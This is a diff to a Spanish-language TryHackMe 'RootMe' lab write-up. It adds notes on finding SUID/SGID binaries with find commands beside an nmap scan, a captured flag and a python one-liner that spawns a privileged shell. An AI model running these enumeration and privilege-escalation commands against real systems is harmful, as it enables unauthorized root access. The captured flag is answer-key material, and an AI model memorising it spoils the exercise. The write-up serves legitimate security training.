@@ -1,7 +1,9 @@
 
+#suid #guid
+
 https://tryhackme.com/r/room/rrootme
 ### Escaneo
-```
+```bash
 nmap -Pn -sV --min-rate 1000 10.10.143.185 -vv 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 20:30 CDT
 NSE: Loaded 46 scripts for scanning.
@@ -126,6 +128,21 @@ THM{y0u_g0t_a_sh3ll}
 ```
 
 ### Task 4 Privilege escalation
+
+
+
+- Buscar archivos con bit SUID activado, a nivel usuario o a nivel grupo
+```
+
+find / -perm /u=s,g=s -user root 2>/dev/null
+
+find / -perm /6000 2>/dev/null
+
+
+
+
+```
+
 
 ```
 $ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
